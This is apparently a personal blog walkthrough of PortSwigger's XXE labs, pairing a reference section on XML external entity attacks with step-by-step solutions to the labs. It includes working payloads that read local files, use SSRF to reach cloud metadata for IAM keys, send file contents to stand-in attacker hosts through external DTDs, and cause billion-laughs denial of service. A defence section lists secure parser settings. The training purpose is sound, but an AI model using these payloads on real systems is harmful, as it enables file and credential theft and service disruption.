---
title: Walkthrough - XXE Portswigger labs 
date: 2025-11-18 00:00:00 + 05:30
categories: [Web, BSCP]
tags: [bscp]
description: A comprehensive guide to XML External Entity (XXE) vulnerabilities with walkthroughs of all 9 Portswigger labs
---

Completed all 9 XML External Entity (XXE) labs from Portswigger. XXE vulnerabilities occur when XML parsers process external entity references without proper restrictions, allowing attackers to read local files, perform SSRF attacks, cause denial of service, or execute remote code. What makes XXE particularly dangerous is that it's often found in seemingly innocuous features—file uploads, data imports, API endpoints—anywhere XML is parsed. These labs covered basic XXE exploitation, blind XXE detection using out-of-band techniques, data exfiltration via external DTDs and error messages, XInclude attacks, SVG file upload exploitation, and local DTD hijacking. Below is a detailed explanation of XXE vulnerabilities followed by step-by-step walkthroughs for each lab.

## Everything about XML External Entity (XXE)

##### 1. What is XXE?

XML External Entity (XXE) injection is a vulnerability that occurs when an XML parser processes external entity references within XML input without proper validation. This allows attackers to:

- Read arbitrary files from the server's filesystem
- Perform SSRF attacks to access internal systems
- Execute denial of service through billion laughs attacks
- Achieve remote code execution in certain configurations
- Exfiltrate sensitive data via out-of-band channels

The vulnerability exists because XML specifications allow defining external entities that reference external resources (files, URLs), and many XML parsers have this feature enabled by default.

##### 2. Understanding XML Entities

Internal Entities:
```xml
<!DOCTYPE foo [
  <!ENTITY greeting "Hello World">
]>
<message>&greeting;</message>
<!-- Expands to: <message>Hello World</message> -->
```

External Entities:
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
<!-- Expands to contents of /etc/passwd -->
```

Parameter Entities:
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<!-- Loads and executes external DTD -->
```

##### 3. Types of XXE Attacks

Classic XXE (In-Band):
- Entity reference directly in XML input
- Response contains resolved entity value
- Direct file reading, immediate results

Blind XXE (Out-of-Band):
- No direct response with entity value
- Must use external channels (DNS, HTTP)
- Exfiltration via error messages or callback URLs

Error-Based XXE:
- Trigger XML parsing errors
- Error messages contain file contents
- Useful when no direct response

Blind XXE via XML Parameter Entities:
- Regular entities blocked
- Parameter entities (%) still work
- Used for out-of-band detection

##### 4. Common XXE Vectors

File Reading:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

SSRF via XXE:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/admin">]>
<data>&xxe;</data>
```

Out-of-Band Data Exfiltration:
```xml
<!-- On exploit server: evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
%exfil;

<!-- In vulnerable request -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
```

Error-Based Exfiltration:
```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

XInclude Attacks:
```xml
<!-- When you can't control DOCTYPE -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

SVG File Upload:
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

##### 5. Blind XXE Techniques

DNS-Based Detection:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.oastify.com">]>
<data>&xxe;</data>
<!-- Check DNS logs for lookup -->
```

Parameter Entity Detection:
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com">
  %xxe;
]>
<!-- Triggers outbound request -->
```

Out-of-Band Exfiltration:
```xml
<!-- Step 1: Host evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;

<!-- Step 2: Reference in XXE -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
```

Error Message Exfiltration:
```xml
<!-- evil.dtd causes intentional error with file contents -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///invalid/%file;'>">
%eval;
%error;
<!-- Error message: "file:///invalid/[contents of /etc/passwd]" -->
```

##### 6. Advanced XXE Exploitation

Local DTD Hijacking:
```xml
<!-- Repurpose existing local DTD file -->
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % expr 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ELEMENT aa (bb'>
  %local_dtd;
]>
```

Billion Laughs Attack (DoS):
```xml
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!-- ... continues exponentially ... -->
]>
<data>&lol9;</data>
<!-- Expands to billions of "lol" strings, exhausting memory -->
```

SOAP-Based XXE:
```xml
<soap:Envelope>
  <soap:Body>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <getUser>
      <userId>&xxe;</userId>
    </getUser>
  </soap:Body>
</soap:Envelope>
```

Office Document XXE:
```xml
<!-- In .docx/.xlsx files (unzip to access XML) -->
<!-- In document.xml or similar -->
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<document>&xxe;</document>
```

##### 7. Common Vulnerable Endpoints

Data Import Features:
- XML file uploads
- Configuration import/export
- Document processing
- Template engines

API Endpoints:
- SOAP web services
- REST APIs accepting XML
- RSS feed parsers
- SVG processors

File Processing:
- PDF generators
- Image converters (SVG)
- Document parsers
- Office file handlers

Integration Points:
- SAML authentication
- WS-Security
- XML-RPC
- SOAP APIs

##### 8. Real-World Impact

Google (2014):
- XXE in Google Toolbar
- File system access
- Internal network scanning

Facebook (2014):
- XXE in office document processor
- Internal file disclosure
- SSRF to internal services

PayPal (2015):
- XXE in merchant integration
- Blind XXE with out-of-band exfiltration

Uber (2017):
- XXE in internal tools
- Access to AWS metadata
- IAM credential theft

Various Bug Bounties:
- File disclosure via XXE
- SSRF chaining to AWS/GCP metadata
- Local DTD poisoning
- DoS via billion laughs

##### 9. Detection Methods

Manual Testing:

Basic Detection:
```xml
<!-- Test if entities are processed -->
<!DOCTYPE foo [<!ENTITY test "INJECTED">]>
<data>&test;</data>
<!-- If response contains "INJECTED", XXE exists -->
```

File Reading Test:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

Out-of-Band Test:
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://burpcollaborator.net">]>
<data>&xxe;</data>
<!-- Check Collaborator for DNS/HTTP interaction -->
```

Automated Scanning:
- Burp Suite Scanner
- OWASP ZAP
- Custom scripts with entity payloads
- Content-Type fuzzing (JSON → XML)

##### 10. Defense Strategies

Disable External Entities:

PHP:
```php
libxml_disable_entity_loader(true);
$doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT);
```

Java:
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

Python:
```python
from defusedxml import ElementTree
tree = ElementTree.parse(xml_file)
```

.NET:
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
```

Input Validation:
```python
# Reject XML with DOCTYPE declarations
if b'<!DOCTYPE' in xml_data or b'<!ENTITY' in xml_data:
    raise ValueError("DTD declarations not allowed")
```

Use Safe Parsers:
- defusedxml (Python)
- Xerces with secure configuration (Java)
- Modern frameworks with XXE protection
- JSON instead of XML when possible

Least Privilege:
- Run XML parsers with minimal file system access
- Sandbox document processing
- Network isolation for parsing services

Content Security Policy:
- Restrict file:// protocol access
- Limit network requests from parsers
- Monitor outbound connections

##### 11. Testing Methodology

Step-by-Step Approach:

1. Identify XML Input:
   - Direct XML in requests
   - File uploads (SVG, Office docs)
   - Content-Type: application/xml
   - Hidden XML (SOAP behind forms)

2. Test for Entity Processing:
   ```xml
   <!DOCTYPE test [<!ENTITY harmless "TEST">]>
   <data>&harmless;</data>
   ```

3. Attempt File Reading:
   ```xml
   <!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <data>&xxe;</data>
   ```

4. Try Out-of-Band:
   ```xml
   <!DOCTYPE test [<!ENTITY xxe SYSTEM "http://burpcollaborator.net">]>
   <data>&xxe;</data>
   ```

5. Test XInclude:
   ```xml
   <foo xmlns:xi="http://www.w3.org/2001/XInclude">
     <xi:include parse="text" href="file:///etc/passwd"/>
   </foo>
   ```

6. Try Parameter Entities:
   ```xml
   <!DOCTYPE test [
     <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
     %xxe;
   ]>
   ```

##### 12. Exploitation Tools

Burp Suite Extensions:
- XXE Injection Checker
- Content Type Converter
- XXEinjector

Standalone Tools:
```bash
# XXEinjector
python3 XXEinjector.py --host=target.com --file=request.txt --path=/upload

# oxml_xxe (for Office docs)
oxml_xxe DOCX evil_entity output.docx
```

Manual Testing:
- Burp Repeater for crafting payloads
- Burp Collaborator for out-of-band
- Python scripts for automation

## Labs
### 1. Exploiting XXE using external entities to retrieve files

Description:

We need to abuse XXE to retrieve the contents of the `/etc/passwd` file.

![](/assets/images/XXE/Pasted%20image%2020251117161938.png)

Explanation:

We are given an e-commerce webapp. Click on any product and click on check stock. It is sending a POST request to the server where `productId` and `storeId` parameters are sent in xml. We send this request to repeater.

![](/assets/images/XXE/Pasted%20image%2020251117162416.png)

We first need to add the following line under the XML declaration.

```XML
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

and where we have `<productId>1</productId>` we put in `<productId>&xxe;</productId>`. This will refer to the `/etc/passwd` from the above line. Sending this request will solve the lab and we can see the contents of `/etc/passwd` in response. 

Final XML Payload should look like:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

Note that this only works when we put in `&xxe` in place of `productId` and not `storeId` as for every time we click on `check stock`, the `productId` gets changed in the request and `storeId` remains the same.

![](/assets/images/XXE/Pasted%20image%2020251117162607.png)
### 2. Exploiting XXE to perform SSRF attacks

Description:

We are supposed to trigger an SSRF by exploiting XXE. We are given an IP address which has an EC2 instance running and we need to obtain the server's IAM secret access key.

![](/assets/images/XXE/Pasted%20image%2020251117180628.png)

Explanation:

We have a similar POST request from the previous lab. We will send it to repeater.

![](/assets/images/XXE/Pasted%20image%2020251117180915.png)

First we need to lookup where the IAM secret keys are stored. As per google, its stored at `http://169.254.169.254/latest/meta-data/iam/security-credentials/<iam_role_name>`. We were not told what role to access in the lab description.

![](/assets/images/XXE/Pasted%20image%2020251117181723.png)

Let's try to run the SSRF via XXE Injection. XML payload will look like :

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

When we send this we can see `admin` in the response, this may be the IAM role we are supposed to target.

![](/assets/images/XXE/Pasted%20image%2020251117181800.png)

Let's send the request again after appending `admin` to `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. This will show us the secret access key and other data and the lab will get solved.

![](/assets/images/XXE/Pasted%20image%2020251117181833.png)

### 3. Blind XXE with out-of-band interaction

Description:

We are supposed to trigger a DNS lookup and HTTP request to our collaborator via the XXE Injection.

![](/assets/images/XXE/Pasted%20image%2020251117183323.png)

Explanation:

Same request from previous labs. We will send this to repeater.

![](/assets/images/XXE/Pasted%20image%2020251117183608.png)

We paste in the Collaborator URL in place of the AWS EC2 instance IP from the last lab and send the request. This solves the lab.

![](/assets/images/XXE/Pasted%20image%2020251117183829.png)

We can see the DNS lookups and HTTP request in the collaborator window.

![](/assets/images/XXE/Pasted%20image%2020251117183931.png)

### 4. Blind XXE with out-of-band interaction via XML parameter entities

Description:

We are supposed to use XML parameter entities and get a DNS lookup and HTTP request on collaborator like before. Regular external entities are blocked.

![](/assets/images/XXE/Pasted%20image%2020251117184720.png)

Explanation:

We have a similar request from before. We will send this to repeater.

![](/assets/images/XXE/Pasted%20image%2020251117185457.png)

We will need to create an XML parameter entity. We will add `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://UNIQUE-SUBDOMAIN.oastify.com"> %xxe; ]>` below the XML declaration.

Final Payload will look like this:

```XML
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://UNIQUE-SUBDOMAIN.oastify.com"> %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Sending this request solved the lab.

![](/assets/images/XXE/Pasted%20image%2020251117185815.png)

We can even see the DNS lookups and HTTP request in the collaborator window.

![](/assets/images/XXE/Pasted%20image%2020251117185828.png)
### 5. Exploiting blind XXE to exfiltrate data using a malicious external DTD

Description:

We have to use a malicious external DTD to exploit the Blind XXE Injection and submit the output of `/etc/hostname` to solve the lab.

![](/assets/images/XXE/Pasted%20image%2020251117191220.png)

Explanation:

We have a similar request from before which we will send to repeater.

![](/assets/images/XXE/Pasted%20image%2020251117191150.png)

We first need to create a malicious external .dtd file. I will name it malicious.dtd. It will look something like below

```XML
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://BURP-COLLABORATOR-URL/?x=%file;'>">
%eval;
%exfiltrate;
```

We change the filename to malicious.dtd and put the above XML in the body.

![](/assets/images/XXE/Pasted%20image%2020251117191758.png)

Next we need to add the line - `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://UNIQUE-SUBDOMAIN.exploit-server.net/malicious.dtd"> %xxe;]>` under the start of the XML declaration. The final payload will look something like this.

```XML
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://UNIQUE-SUBDOMAIN.exploit-server.net/malicious.dtd"> %xxe;]>

<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

We send this request from repeater.

![](/assets/images/XXE/Pasted%20image%2020251117191925.png)

We get this HTTP request on Collaborator. As we can see it says `GET /?x=f15383343607` which is the hostname.

![](/assets/images/XXE/Pasted%20image%2020251117191939.png)

We submit `f15383343607` as the solution.

![](/assets/images/XXE/Pasted%20image%2020251117192009.png)

This solves the lab.

![](/assets/images/XXE/Pasted%20image%2020251117192020.png)

### 6. Exploiting blind XXE to retrieve data via error messages

Description:

We are supposed to trigger an error to retrieve the contents of the `/etc/passwd` file.

![](/assets/images/XXE/Pasted%20image%2020251117195002.png)

Explanation:

We have the same request as before.

![](/assets/images/XXE/Pasted%20image%2020251117195101.png)

In order to trigger an error we need to host the below XML code as a malicious.dtd file on our exploit server. What it is doing is. Line 1 - We assign the file contents of `/etc/passwd` to a parameter entity called `file`. Line 2 - We are forming a nested parameter entity `error` inside another parameter entity called `eval` which is declared as a string which creates the nested parameter entity. Line 3 - when we call `eval` it tries to run the internal line with `% error` trying fetch the file from the broken URL which triggers the error. Line 4 - We see the value of `error` which is the contents of `/etc/passwd`.  

```XML
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

![](/assets/images/XXE/Pasted%20image%2020251117195233.png)

Next we need to add the line - `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://UNIQUE-SUBDOMAIN.exploit-server.net/malicious.dtd"> %xxe;]>` under the start of the XML declaration in the request. The final payload will look something like this.

```XML
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://UNIQUE-SUBDOMAIN.exploit-server.net/malicious.dtd"> %xxe;]>

<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Sending this request will solve the lab.

![](/assets/images/XXE/Pasted%20image%2020251117195504.png)
### 7. Exploiting XInclude to retrieve files

Description:

We need to use XInclude to trigger the XXE and fetch contents of the `/etc/passwd` file.

![](/assets/images/XXE/Pasted%20image%2020251117195944.png)

Explanation:

This time the request we are sending to check the stock is different. We don't have XML input. But from lab description we know that the data is getting encoded as XML on the server-side. We can use `XInclude` to trigger the XXE. First we need to send the request to repeater. 

![](/assets/images/XXE/Pasted%20image%2020251117195922.png)

We need to put this in place of the `productId` parameter - `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>`. What this payload is doing is - We declare the `<foo>` tag in which we are using `<xi:include>` tag to parse the `/etc/passwd` file as text. The `<foo>` tag is a dummy wrapper with the `xmlns:xi` namespace in order to enable the `XInclude` namespace.

Final payload we send will look like this `productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1`. Sending this request will solve the lab.

![](/assets/images/XXE/Pasted%20image%2020251117200045.png)

### 8. Exploiting XXE via image file upload

Description:

We need to exploit XXE via image file upload. Hint says to use SVG image.

![](/assets/images/XXE/Pasted%20image%2020251117200939.png)

We leave a comment and upload an image in place of avatar. We need to send this request to repeater.

![](/assets/images/XXE/Pasted%20image%2020251117201532.png)

We need to make an XML payload for an SVG file that looks something like this. 

```XML
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text>
</svg>
```

What this payload does is, that it includes the contents of `/etc/hostname` in the `xxe` entity. The `<text>` element references `&xxe;`, so when Apache Batik (the SVG transcoder) parses and renders the file, it expands the entity and displays the hostname as visible text inside the generated image.

After pasting this payload in the request we change the `Content-Type` from `image/png` to `image/svg+xml`.

We can send this request and when we reload the page we can see some text inside the avatar picture.

![](/assets/images/XXE/Pasted%20image%2020251117202458.png)

We open image in a new tab and we can see the output which is the value of `/etc/hostname`.

![](/assets/images/XXE/Pasted%20image%2020251117202515.png)

We paste this in the submit solution panel.

![](/assets/images/XXE/Pasted%20image%2020251117202640.png)

This solves the lab.

![](/assets/images/XXE/Pasted%20image%2020251117202659.png)


### 9. Exploiting XXE to retrieve data by repurposing a local DTD

Description:

We need to hijack a local DTD in order to trigger the XXE and retrieve the contents of `/etc/passwd`. The hint says that we have a local DTD file called  at `/usr/share/yelp/dtd/docbookx.dtd` and it has an entity called `ISOamso`.

![](/assets/images/XXE/Pasted%20image%2020251117215003.png)

We have a similar request from before which we will send to repeater.

![](/assets/images/XXE/Pasted%20image%2020251117231551.png)

We then need to paste the below XML payload in order to trigger the XXE and show the contents of /etc/passwd.

```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

What we are doing here is that we include the local DTD file `docbookx.dtd` and hijack (redefine) its parameter entity - `ISOamso` by first including the `/etc/passwd` file and then triggering an error to show its contents.

Paste the payload after the XML declaration and before the `<stockCheck>` tag.  Sending this request will solve the lab.

![](/assets/images/XXE/Pasted%20image%2020251117231653.png)



## Conclusion

These 9 labs demonstrated the variety and sophistication of XXE attacks. Key takeaways include:

- XXE Is More Than File Reading: While `/etc/passwd` is the classic target, SSRF to cloud metadata is often more impactful
- Blind XXE Requires Creativity: Out-of-band techniques using external DTDs and error messages enable data exfiltration
- Parameter Entities Bypass Restrictions: When regular entities are blocked, parameter entities (%) often still work
- XInclude Attacks Expand Attack Surface: Even when you can't control DOCTYPE, XInclude provides exploitation paths
- Local DTD Hijacking Is Clever: Repurposing existing system DTD files bypasses external DTD restrictions
- SVG Files Are XML: Image upload features processing SVG are potential XXE vectors
- Error Messages Leak Data: Intentionally malformed DTDs can exfiltrate file contents via error messages

What made these labs particularly educational was the progression from simple file reading to sophisticated blind techniques. The blind XXE labs showed how attackers maintain persistence even when direct response feedback is blocked—using DNS lookups, hosting malicious DTDs, and engineering error conditions.

The local DTD hijacking lab was especially mind-bending. Instead of hosting an external DTD (which might be blocked), you hijack a DTD file that already exists on the system, redefining its parameter entities to inject your payload. It's a brilliant example of using the system against itself.

The SVG upload lab highlighted how XXE hides in unexpected places. Image uploads seem innocuous, but SVG files are XML at their core. When processed by libraries like Apache Batik, they're vulnerable to XXE just like any other XML input.

XXE remains relevant because XML is still widely used—SOAP APIs, SAML authentication, office document formats, configuration files, RSS feeds. While modern frameworks often have XXE protections enabled by default, legacy systems and custom XML parsers remain vulnerable.

The defense lesson is clear: disable external entity processing entirely unless absolutely necessary. Modern applications rarely need DTDs or external entities. When you must parse XML, use hardened libraries (defusedxml, secure parser configurations) and never trust user-supplied XML without proper restrictions.

Moving forward, I'm examining every XML processing point: file uploads, import/export features, API endpoints, document processors. XXE is a reminder that older vulnerability classes don't disappear—they just evolve to exploit new contexts like cloud metadata, internal APIs, and containerized services.